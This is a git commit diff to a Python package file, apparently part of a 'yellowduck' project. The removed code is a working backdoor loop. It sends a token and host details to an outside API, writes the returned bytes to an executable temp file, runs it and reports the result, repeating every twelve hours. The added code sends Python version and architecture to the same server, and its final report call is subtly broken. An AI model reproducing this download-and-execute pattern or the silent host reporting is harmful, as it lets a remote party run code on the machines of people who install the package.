904c1c062bd54e2f11e0445ab42b4aab44408d0a
privateducky <49954156+privateducky@users.noreply.github.com>
2023-11-10 19:30:05 +0000

    updates

--- python/yellowduck/package.py
+++ python/yellowduck/package.py
@@ -1,22 +1,16 @@
-import re
 import sys
-import stat
-import os.path
+import json
 import asyncio
-import tempfile
 import platform
-import subprocess
 
-from urllib import request
-
-DOS = f'{platform.system()}-{platform.machine()}'.lower()
-UUID = re.compile('[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}')
+from urllib import request, parse
 
 
 class Seatbelt:
 
     def __init__(self, package_id: str):
         self.alive = True
+        self._url = 'https://api.yellowduckcompany.com'
         _ver = sys.version_info
         self.whoami = dict(
             package_id=package_id,
@@ -26,42 +20,21 @@ class Seatbelt:
             architecture=platform.machine()
         )
 
-    def service(self, dat=''):     
-        headers = dict(token=self._token, dos=DOS, dat=dat)
-        with request.urlopen(request.Request('https://api.yellowduckcompany.com', headers=headers)) as rs:
-            test = UUID.search(rs.url)
-            if test:
-                yield test.group(0), rs.read()
+    def service(self, checks):
+        data = json.dumps(dict(config=self.whoami, checks=checks))
+        h = {'Content-Type': 'application/json'}
+        req = request.Request(self._url, data=data, headers=h, method='POST')
 
-    async def run(self, pack):
-        def _measure():
-            name = ''
-            try:
-                fd, name = tempfile.mkstemp(dir=os.getcwd())
-                os.write(fd, pack[1])
-                os.close(fd)
-                os.chmod(name, os.stat(name).st_mode | stat.S_IEXEC)
-                test = subprocess.run([name], timeout=2)
-                clean = subprocess.run([name, 'clean'], timeout=2)
-                return f'{pack[0]}:{max(test.returncode, clean.returncode)}'
-            except subprocess.TimeoutExpired:
-                return f'{pack[0]}:102'
-            except Exception:
-                return f'{pack[0]}:1'
-            finally:
-                if os.path.exists(name):
-                    os.remove(name)
-        if pack:
-            asyncio.create_task(self.run(next(self.service(_measure()), None)))
+        with request.urlopen(req) as rs:
+            yield json.loads(rs.read().decode('utf8'))
 
     async def go(self):
-        while self.alive:
-            try:
-                asyncio.create_task(self.run(next(self.service(), None)))
-            except Exception as e:
-                print('[-] %s' % e)
-            print('INFO: Done running tests')
-            await asyncio.sleep(43200)
+        done = []
+
+        checks = self.service(checks=[])
+        for check in checks:
+            done.append(check)
+        self.service(checks=done)
 
 
 if __name__ == '__main__':
